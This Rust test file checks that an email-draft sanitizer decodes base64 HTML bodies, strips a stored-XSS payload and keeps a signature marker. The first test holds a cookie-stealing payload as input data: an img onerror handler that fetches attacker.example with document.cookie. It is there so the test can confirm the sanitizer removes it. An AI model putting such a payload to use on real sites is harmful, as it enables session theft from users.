use super::*;
use base64::engine::general_purpose::URL_SAFE_NO_PAD;

fn input_with_body_html(html: &str) -> CreateDraftInput {
    CreateDraftInput {
        db_id: None,
        provider_id: None,
        replying_to_id: None,
        provider_thread_id: None,
        thread_db_id: None,
        subject: String::new(),
        to: vec![],
        cc: vec![],
        bcc: vec![],
        body_text: None,
        body_html: Some(URL_SAFE_NO_PAD.encode(html)),
        body_macro: None,
        headers_json: None,
        send_time: None,
        include_signature: None,
        actor: None,
    }
}

#[test]
fn sanitizes_the_decoded_body() {
    // Stored XSS: this body is rendered via innerHTML by every user the thread
    // is shared with, so the handler must not survive the round trip.
    let mut input = input_with_body_html(
        r#"<body><p>hello</p><img src=x onerror="fetch('https://attacker.example/?c='+document.cookie)"></body>"#,
    );

    decode_and_sanitize_html_body(&mut input).expect("decodes");

    let body = input.body_html.expect("body kept");
    assert!(body.contains("<p>hello</p>"), "got: {body}");
    assert!(
        !body.to_ascii_lowercase().contains("onerror"),
        "got: {body}"
    );
    assert!(!body.contains("attacker.example"), "got: {body}");
}

#[test]
fn keeps_signature_marker_so_injection_stays_idempotent() {
    // Sanitization runs before maybe_inject_signature; if the marker class were
    // stripped, has_signature would miss a client-baked signature and we would
    // append a second one.
    let mut input =
        input_with_body_html(r#"<p>hi</p><div class="macro-email-signature"><p>Regards</p></div>"#);

    decode_and_sanitize_html_body(&mut input).expect("decodes");

    let body = input.body_html.expect("body kept");
    assert!(super::super::signature::has_signature(&body), "got: {body}");
}

#[test]
fn missing_body_html_is_left_alone() {
    let mut input = input_with_body_html("<p>x</p>");
    input.body_html = None;

    decode_and_sanitize_html_body(&mut input).expect("decodes");

    assert!(input.body_html.is_none());
}
